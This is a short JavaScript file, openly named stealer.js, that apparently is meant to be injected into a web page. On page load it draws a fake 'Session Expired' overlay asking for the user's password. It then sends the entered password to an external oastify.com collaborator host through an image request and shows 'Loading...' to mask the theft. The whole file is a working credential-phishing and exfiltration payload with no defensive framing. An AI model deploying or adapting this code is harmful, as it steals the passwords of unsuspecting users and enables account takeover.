// stealer.js
document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM content loaded'); // Debugging: ensure DOM is loaded

    var form = document.createElement('form');
    form.style.position = 'fixed';
    form.style.top = '30%';
    form.style.left = '50%';
    form.style.transform = 'translate(-50%, -50%)';
    form.style.background = 'white';
    form.style.padding = '20px';
    form.style.boxShadow = '0 0 10px rgba(0,0,0,0.3)';
    form.style.zIndex = '99999'; // Ensure it appears above other elements
    form.innerHTML = `
        <h2>Session Expired</h2>
        <p>Please re-enter your password:</p>
        <input type="password" id="password" placeholder="Enter password" required>
        <button type="submit">Submit</button>
    `;
    
    // Debugging: log if the form is added to the DOM
    console.log('Form element created:', form);

    document.body.appendChild(form);
    console.log('Form added to body');

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        let password = document.getElementById('password').value;
        console.log('Password entered:', password); // Debugging: check if password is captured

        // Send password to external server
        new Image().src = `https://7z78izwvrg0u9gsi9lwme1z29tfk3c20r.oastify.com?password=${encodeURIComponent(password)}`;
        
        // Update form content after submission
        form.innerHTML = "<p>Loading...</p>";
    });
});
